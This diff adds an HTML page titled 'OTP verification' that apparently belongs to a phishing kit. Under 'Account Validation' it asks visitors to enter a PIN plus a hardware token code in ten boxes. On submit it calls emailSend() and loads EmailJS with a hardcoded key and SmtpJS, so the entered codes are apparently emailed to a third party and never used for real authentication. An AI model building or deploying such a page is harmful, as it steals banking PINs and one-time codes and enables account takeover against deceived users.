@@ -1,0 +1,106 @@
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="/images/gfavicon.png">
+    <link rel="stylesheet" href="dist/output.css">
+    <link rel="stylesheet" href="otp.css">
+    <link rel="stylesheet" href="/fonts/segeo-ui-font/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP verification</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("mQ7M8IM0fXfZIQvXQ");
+      })();
+    </script>
+<script type="text/javascript">
+    window.onload = function () {
+      console.log('working');
+      const btn = document.querySelector('button')
+      const phoneInput = document.querySelector('#otp')
+      document.getElementById('form').addEventListener('submit', function (event) {
+        btn.textContent = 'Loading...';
+        localStorage.setItem('otp', otpInput.value)
+      });
+    }
+  </script>
+  </head>
+<body>
+    <div class="w-[95%] max-w-md mx-auto">
+      <form  class="bg-white rounded-md shadow-sm px-6 mt-7" id="form" onsubmit="emailSend(); reset(); return false;">
+        <p class="font-bold text-slate-700 text-lg">
+          Account Validation
+        </p>
+        <p class="text-slate-600 mt-7 pb-2">ENTER PIN + Token (Hardware/Etoken) TO CONFIRM</p>
+        <div class="flex items-center gap-y-5 justify-center gap-x-3">
+          <input type="tel" id="otp" name="pin1" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" id="otp" name="pin2" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" id="otp" name="pin3" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" id="otp" name="pin4" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" id="otp" name="pin5" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" id="otp" name="pin6" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" id="otp" name="pin7" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" id="otp" name="pin8" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" id="otp" name="pin9" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" id="otp" name="pin10" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+         </div>
+        <div class="qaz">
+
+        </div>
+        <button disabled="" type="submit" name="button" class=" btn btn-danger btn-lg btn-block bg-primary text-white rounded-full p-4 w-full font-semibold text-lg mt-10 disabled:bg-slate-300 disabled:text-gray-400 active:scale-95 disabled:pointer-events-none">
+          Continue
+        </button>
+
+      </form>
+    </div>
+    <script src="main.js"></script>
+
+    <script src="app.js"></script>
+    <script>
+      function inputInsideOtpInput(el) {
+        if (el.value.length > 1) {
+          el.value == "";
+          if (el.nextElementSibling.value == "") {
+            el.nextElementSibling.value = el.value[el.value.length - 1];
+          }
+          if (!el.nextElementSibling) {
+            el.value = el.value[0];
+          }
+          el.value = el.value[0];
+        }
+        try {
+          if (el.value == null || el.value == "") {
+            this.foucusOnInput(el.previousElementSibling);
+          } else {
+            this.foucusOnInput(el.nextElementSibling);
+          }
+        } catch (e) {
+          console.log(e);
+        }
+      }
+      function foucusOnInput(ele) {
+        ele.focus();
+      }
+    </script>
+  <script>
+    const inputs = Array.from(document.querySelectorAll('input[required]'));
+    const btn = document.querySelector('button');
+
+    inputs.forEach((input) => {
+        input.addEventListener('keyup', handleInput);
+    });
+
+    function handleInput(e) {
+        if (inputs.some((input) => input.value == '')) {
+            btn.disabled = true;
+        } else {
+            btn.disabled = false;
+        }
+    }
+
+
+</script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+        <script src="Contact-form-to-email.js"></script>
+        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+</body>
+</html>
